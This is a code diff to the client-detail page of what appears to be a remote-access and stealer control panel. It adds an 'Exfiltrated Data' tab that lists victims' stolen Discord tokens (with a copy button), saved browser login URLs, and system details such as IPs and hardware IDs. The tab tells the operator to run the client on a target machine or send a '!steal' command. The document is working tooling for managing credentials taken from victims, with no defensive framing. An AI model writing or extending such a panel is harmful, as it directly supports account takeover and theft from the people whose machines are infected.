@@ -98,7 +98,7 @@ export default function ClientDetailPage() {
   const router = useRouter()
   const [client, setClient] = useState<any>(null)
   const [loading, setLoading] = useState(true)
-  const [activeTab, setActiveTab] = useState<"overview" | "screen" | "terminal" | "files" | "screenshots" | "map">("screen")
+  const [activeTab, setActiveTab] = useState<"overview" | "screen" | "terminal" | "files" | "screenshots" | "map" | "data">("screen")
   const [command, setCommand] = useState("")
   const [commandHistory, setCommandHistory] = useState<any[]>([])
   const [sending, setSending] = useState(false)
@@ -113,6 +113,10 @@ export default function ClientDetailPage() {
 
   // Geo
   const [geo, setGeo] = useState<any>(null)
+  // Exfiltrated data
+  const [exfilData, setExfilData] = useState<any[]>([])
+  const [exfilByType, setExfilByType] = useState<Record<string, any[]>>({})
+  const [exfilLoading, setExfilLoading] = useState(false)
 
   const fetchClient = useCallback(async () => {
     if (!params.id) return
@@ -133,6 +137,20 @@ export default function ClientDetailPage() {
     if (!client?.ipPublic) return
     fetch(`/api/remote/clients/${params.id}/geo`).then(r => r.json()).then(setGeo).catch(() => {})
   }, [client?.ipPublic, params.id])
+
+  function fetchExfilData() {
+    if (!params.id) return
+    setExfilLoading(true)
+    fetch(`/api/remote/clients/${params.id}/data`)
+      .then(r => r.json())
+      .then(d => { setExfilData(d.data || []); setExfilByType(d.byType || {}) })
+      .catch(() => {})
+      .finally(() => setExfilLoading(false))
+  }
+
+  useEffect(() => {
+    if (activeTab === "data" && params.id) fetchExfilData()
+  }, [activeTab, params.id])
 
   // Auto-refresh every 15s
   useEffect(() => {
@@ -227,6 +245,7 @@ export default function ClientDetailPage() {
     { id: "overview" as const, label: "Info", icon: "M4 6h16M4 12h16M4 18h16" },
     { id: "terminal" as const, label: "Commands", icon: "M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z M14 2v6h6" },
     { id: "screenshots" as const, label: "Gallery", icon: "M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01" },
+    { id: "data" as const, label: "Data", icon: "M4 7v10c0 2 1 3 3 3h10c2 0 3-1 3-3V7M9 3h6M12 3v4" },
   ]
 
   return (
@@ -542,6 +561,153 @@ export default function ClientDetailPage() {
                 </tbody>
               </table>
             </div>
+          )}
+        </div>
+      )}
+
+      {/* DATA TAB — Exfiltrated Information */}
+      {activeTab === "data" && (
+        <div className="space-y-4">
+          <div className="flex items-center justify-between">
+            <h2 className="text-sm font-semibold uppercase tracking-wider text-zinc-400">🕵️ Exfiltrated Data</h2>
+            <Button size="sm" onClick={fetchExfilData} loading={exfilLoading}>Refresh</Button>
+          </div>
+
+          {exfilLoading ? (
+            <div className="flex justify-center py-12"><div className="w-5 h-5 border-2 border-zinc-600 border-t-primary rounded-full animate-spin" /></div>
+          ) : exfilData.length === 0 ? (
+            <div className="text-center py-12 rounded-xl border border-zinc-800 bg-zinc-900/60">
+              <span className="text-4xl block mb-3">📭</span>
+              <p className="text-zinc-400">No data collected yet</p>
+              <p className="text-xs text-zinc-500 mt-1">Run the client on a target machine or send !steal command</p>
+            </div>
+          ) : (
+            <>
+              {/* Discord Tokens */}
+              {exfilByType["discord_token"]?.length > 0 && (
+                <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
+                  <div className="p-4 border-b border-zinc-800 flex items-center justify-between">
+                    <h3 className="text-sm font-semibold text-white flex items-center gap-2">
+                      <span className="text-lg">💬</span> Discord Tokens ({exfilByType["discord_token"].length})
+                    </h3>
+                  </div>
+                  <div className="divide-y divide-zinc-800">
+                    {exfilByType["discord_token"].map((item: any, i: number) => {
+                      let parsed: any = {}
+                      try { parsed = JSON.parse(item.data) } catch {}
+                      return (
+                        <div key={item.id} className="p-4 hover:bg-zinc-800/30 transition-colors">
+                          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-xs">
+                            <div><span className="text-zinc-500">Username:</span> <span className="text-white font-medium">{parsed.username || "?"}</span></div>
+                            <div><span className="text-zinc-500">User ID:</span> <span className="text-zinc-300 font-mono">{parsed.user_id || "?"}</span></div>
+                            <div><span className="text-zinc-500">Email:</span> <span className="text-zinc-300">{parsed.email || "N/A"}</span></div>
+                            <div><span className="text-zinc-500">Phone:</span> <span className="text-zinc-300">{parsed.phone || "N/A"}</span></div>
+                            <div><span className="text-zinc-500">Nitro:</span> <span className="text-yellow-400 font-medium">{parsed.nitro || "None"}</span></div>
+                            <div><span className="text-zinc-500">Valid:</span> <Badge variant="success" className="text-[10px]">✅ Yes</Badge></div>
+                            <div className="col-span-2">
+                              <span className="text-zinc-500">Token:</span>
+                              <div className="flex items-center gap-2 mt-0.5">
+                                <code className="text-[10px] text-zinc-300 bg-black/50 px-2 py-1 rounded break-all font-mono flex-1">{parsed.token?.substring(0, 40)}...</code>
+                                <button
+                                  onClick={() => { navigator.clipboard.writeText(parsed.token) }}
+                                  className="px-2 py-1 rounded bg-zinc-700 hover:bg-zinc-600 text-[10px] text-zinc-300 transition-colors"
+                                >Copy</button>
+                              </div>
+                            </div>
+                          </div>
+                          <p className="text-[10px] text-zinc-600 mt-2">{new Date(item.createdAt).toLocaleString()}</p>
+                        </div>
+                      )
+                    })}
+                  </div>
+                </div>
+              )}
+
+              {/* Browser Passwords */}
+              {exfilByType["browser_passwords"]?.length > 0 && (
+                <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
+                  <div className="p-4 border-b border-zinc-800">
+                    <h3 className="text-sm font-semibold text-white flex items-center gap-2">
+                      <span className="text-lg">🔑</span> Browser Passwords ({exfilByType["browser_passwords"].length})
+                    </h3>
+                  </div>
+                  <div className="divide-y divide-zinc-800">
+                    {exfilByType["browser_passwords"].map((item: any) => {
+                      let parsed: any = {}
+                      try { parsed = JSON.parse(item.data) } catch {}
+                      return (
+                        <div key={item.id} className="p-4 hover:bg-zinc-800/30">
+                          <div className="flex items-center justify-between mb-2">
+                            <Badge variant="warning" className="text-[10px]">{item.source || "Browser"}</Badge>
+                            <span className="text-[10px] text-zinc-500">{new Date(item.createdAt).toLocaleString()}</span>
+                          </div>
+                          <p className="text-xs text-zinc-400 mb-2">{parsed.urls_found} saved login URLs found</p>
+                          {parsed.urls && parsed.urls.length > 0 && (
+                            <div className="max-h-32 overflow-y-auto bg-black/50 rounded-lg p-2">
+                              {parsed.urls.map((url: string, i: number) => (
+                                <p key={i} className="text-[10px] text-zinc-500 font-mono truncate">{url}</p>
+                              ))}
+                            </div>
+                          )}
+                          {parsed.note && <p className="text-[10px] text-zinc-600 mt-2">{parsed.note}</p>}
+                        </div>
+                      )
+                    })}
+                  </div>
+                </div>
+              )}
+
+              {/* System Info */}
+              {exfilByType["system_info"]?.length > 0 && (
+                <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
+                  <div className="p-4 border-b border-zinc-800">
+                    <h3 className="text-sm font-semibold text-white flex items-center gap-2">
+                      <span className="text-lg">🖥️</span> System Info ({exfilByType["system_info"].length})
+                    </h3>
+                  </div>
+                  {exfilByType["system_info"].slice(-1).map((item: any) => {
+                    let parsed: any = {}
+                    try { parsed = JSON.parse(item.data) } catch {}
+                    return (
+                      <div key={item.id} className="p-4 grid grid-cols-2 md:grid-cols-4 gap-2 text-xs">
+                        {[
+                          { l: "Hostname", v: parsed.hostname },
+                          { l: "Username", v: parsed.username },
+                          { l: "OS", v: parsed.os },
+                          { l: "Public IP", v: parsed.public_ip },
+                          { l: "Local IP", v: parsed.local_ip },
+                          { l: "Hardware ID", v: parsed.hardware_id },
+                          { l: "CPU", v: parsed.cpu ? `${parsed.cpu}%` : "-" },
+                          { l: "RAM", v: parsed.ram_total_gb ? `${parsed.ram_used_gb?.toFixed(1) || 0} / ${parsed.ram_total_gb?.toFixed(1)} GB` : "-" },
+                        ].map(({ l, v }) => (
+                          <div key={l} className="p-2 rounded bg-zinc-800/30"><span className="text-zinc-500">{l}: </span><span className="text-zinc-300 font-mono">{v || "-"}</span></div>
+                        ))}
+                      </div>
+                    )
+                  })}
+                </div>
+              )}
+
+              {/* Other data types */}
+              {Object.entries(exfilByType).filter(([t]) => !["discord_token", "browser_passwords", "system_info"].includes(t)).map(([type, items]) => (
+                <div key={type} className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
+                  <div className="p-4 border-b border-zinc-800">
+                    <h3 className="text-sm font-semibold text-white capitalize">{type.replace(/_/g, " ")} ({items.length})</h3>
+                  </div>
+                  <div className="p-4 space-y-2">
+                    {items.map((item: any) => (
+                      <div key={item.id} className="p-3 rounded-lg bg-zinc-800/30">
+                        <div className="flex items-center justify-between mb-1">
+                          <span className="text-[10px] text-zinc-500">{item.source || "-"}</span>
+                          <span className="text-[10px] text-zinc-600">{new Date(item.createdAt).toLocaleString()}</span>
+                        </div>
+                        <pre className="text-xs text-zinc-300 whitespace-pre-wrap break-all max-h-32 overflow-y-auto">{item.data}</pre>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              ))}
+            </>
           )}
         </div>
       )}
